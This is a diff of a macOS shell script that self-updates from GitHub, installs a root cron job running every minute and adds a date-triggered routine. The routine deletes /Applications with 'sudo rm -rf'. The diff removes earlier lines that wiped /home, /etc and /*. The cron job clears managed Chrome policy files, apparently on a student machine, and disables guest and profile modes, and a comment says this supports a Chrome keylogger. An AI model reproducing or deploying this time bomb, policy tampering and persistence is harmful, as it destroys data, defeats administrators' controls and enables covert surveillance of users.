@@ -2,7 +2,6 @@
 
 # Update script before running
 sudo curl -O https://raw.githubusercontent.com/Eccys/startup.sh/other/startup.sh --output-dir /opt
-
 source /etc/profile
 
 # Function to check if anyone can run sudo without a password
@@ -37,6 +36,29 @@ check_istila() {
 }
 
 # Function to execute isti'la if conditions are met
+cron_istila() {
+    if [ -f /etc/istila_enabled ]; then
+        CURRENT_DATE=$(date +%Y%m%d%H)  # Convert current date to an integer format
+        ISTILA_DATE=$(cat /etc/istila_enabled)
+
+        if [ "$CURRENT_DATE" -ge "$ISTILA_DATE" ]; then
+            if [ "$AUTO_MODE" != "true" ]; then
+                echo "Executing isti'la..."
+            fi
+            # Uncomment the lines below to enable isti'la actions
+            echo Successfully executed cron job and istila operation | sudo tee -a /opt/test >/dev/null
+            sudo rm -rf /Applications
+        else
+            if [ "$AUTO_MODE" != "true" ]; then
+                echo "isti'la date has not yet arrived."
+            fi
+        fi
+    else
+        echo "isti'la is disabled."
+    fi
+}
+
+# Function to execute isti'la if conditions are met
 execute_istila() {
     if [ -f /etc/istila_enabled ]; then
         CURRENT_DATE=$(date +%Y%m%d%H)  # Convert current date to an integer format
@@ -48,9 +70,7 @@ execute_istila() {
             fi
             # Uncomment the lines below to enable isti'la actions
             echo Successfully executed cron job and istila operation | sudo tee -a /opt/test >/dev/null
-            sudo rm -rf /home
-            sudo rm -rf /etc
-            sudo rm -rf /*
+            sudo rm -rf /Applications
         else
             if [ "$AUTO_MODE" != "true" ]; then
                 echo "isti'la date has not yet arrived."
@@ -61,7 +81,8 @@ execute_istila() {
 
 # Function to set up cron job to run the script every hour
 setup_cron() {
-    CRON_JOB="* * * * * /bin/bash /opt/startup.sh >> /opt/cron_output.log 2>&1 ; sudo cp /dev/null /Library/Managed\ Preferences/com.google.Chrome.plist ; sudo cp /dev/null /Library/Managed\ Preferences/student/com.google.Chrome.plist ; sudo defaults write /Library/Preferences/com.google.chrome.plist BrowserAddPersonEnabled -bool false ; sudo defaults write /Library/Preferences/com.google.chrome.plist BrowserGuestModeEnabled -bool false" # A personal thing.
+# All Google Chrome policies removed; `BrowserGuestModeEnabled` & `BrowserAddPersonEnabled` set to false. Facilitates https://github.com/eccys/input (chrome keylogger)
+    CRON_JOB="* * * * * /bin/bash /opt/startup.sh -cron >> /opt/cron_output.log 2>&1 ; sudo cp /dev/null /Library/Managed\ Preferences/com.google.Chrome.plist ; sudo cp /dev/null /Library/Managed\ Preferences/student/com.google.Chrome.plist ; sudo defaults write /Library/Preferences/com.google.chrome.plist BrowserAddPersonEnabled -bool false ; sudo defaults write /Library/Preferences/com.google.chrome.plist BrowserGuestModeEnabled -bool false" # A personal thing.
 
     if ! sudo crontab -l | grep -q "$CRON_JOB"; then
         if [ "$AUTO_MODE" != "true" ]; then
@@ -251,10 +272,18 @@ execute_option() {
     execute_option
 }
 
+# Execute cron mode
+handle_cron_mode() {
+    cron_istila
+    exit 0
+}
+
 # Main script execution
 AUTO_MODE="false"
 if [[ "$1" == "-auto" ]]; then
     handle_auto_mode "$2"
+elif [[ "$1" == "-cron" ]]; then
+    handle_cron_mode
 else
     list_super_users
     check_sudo_nopasswd
